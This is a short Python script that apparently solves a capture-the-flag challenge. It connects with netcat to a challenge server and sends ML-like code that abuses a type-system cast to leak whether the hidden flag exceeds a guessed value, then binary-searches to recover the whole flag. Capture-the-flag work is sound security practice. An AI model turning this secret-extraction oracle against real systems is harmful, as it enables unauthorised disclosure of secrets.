import subprocess

code = '''
let ans = ref 0 in
let write = ((fn (val: int) => ((ans := val) :> private unit)) :> private (int -> private unit)) in
(if (flag > {}) then (write 1) else (write 0));
!ans
'''

n = 8 * 36
low = 0
high = 1 << n

while low <= high:
    mid = (low + high) >> 1

    process = subprocess.Popen(['nc', 'wolf.chal.pwning.xxx', '4856'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    out, err = process.communicate(code.format(mid))

    if out[0] == '1':
        low = mid + 1
    else:
        high = mid - 1
    print (low, high)

print ('%0{}x'.format(n) % low).decode('hex')
